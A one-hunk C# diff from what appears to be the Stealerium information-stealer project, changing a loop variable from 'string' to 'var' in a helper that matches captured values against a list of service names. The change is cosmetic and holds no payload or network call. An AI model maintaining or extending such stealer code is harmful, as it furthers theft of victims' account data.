@@ -74,7 +74,7 @@ namespace Stealerium.Helpers
 
         private static void DetectServices(string value, string[] toscan, List<string> detected, bool ondetect)
         {
-            foreach (string service in toscan)
+            foreach (var service in toscan)
                 if (value.ToLower().Contains(service) && value.Length < 25)
                     if (AppendValue(value, detected))
                     {
